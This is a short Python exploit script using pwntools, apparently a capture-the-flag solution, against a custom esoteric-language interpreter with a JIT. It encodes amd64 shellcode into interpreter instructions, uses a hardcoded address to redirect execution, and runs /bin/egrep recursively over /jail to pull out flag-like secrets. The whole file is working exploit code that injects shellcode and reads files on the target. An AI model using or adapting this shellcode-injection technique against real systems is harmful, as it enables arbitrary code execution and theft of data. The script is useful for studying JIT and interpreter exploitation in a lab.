#!/usr/bin/env python3

import os
import struct
from pwn import *

context.arch = "amd64"

def generate_number(num):
	code  = "iqiq"
	code += "ij"
	for i in range(64):
		if (num >> i) & 1:
			code += "+rj"
		code += "*jq"
	return code

def generate_shellcode(shellcode):
	while len(shellcode) % 8 > 0:
		shellcode += b"\x00"

	code = ""

	for i in range(0, len(shellcode), 8):
		num = struct.unpack( "<Q", shellcode[ i : i+8 ] )[ 0 ]
		code += "^rr^jj^qq" + generate_number(num) + "pr"

	return code



jit_enable = "00000000000000000000"

shellcode = shellcraft.pushstr( "/bin/egrep" )
shellcode += "mov rdi, rsp;"
shellcode += shellcraft.pushstr_array( "rsi", ["/bin/egrep", "-r", '[A-Z0-9]{31}=', '/jail'])
shellcode += "mov rdx, 0;"
shellcode += "mov rax, 59;"
shellcode += "syscall;"

code = jit_enable
code += generate_shellcode(asm(shellcode)) + "^rr^qq^jj^ll"
code += generate_number(0x5B3AF0) + "^qq^jj^ll"
code += "iqiqiqiqiqiqiqiq"
code += "Bl"
code += "-lr/lq^LL-Ll"
code += "^rr^qq^jj^ll"
code += "Bq"
# code += "iqiqiqiqiqiqiqiqiqiqiqiqiqiqiqiqiqiq"
# code += generate_number(0x462be0) + "mqr"
code += "^rr^rr^rr^rr^rr^rr^rr^rr^rr^rr^rr^rr^rr^rr^rr^rr^rr^rr^rr^rr^rr^rr^rr^rrpq?000000000000000000000000000000"
print(code)
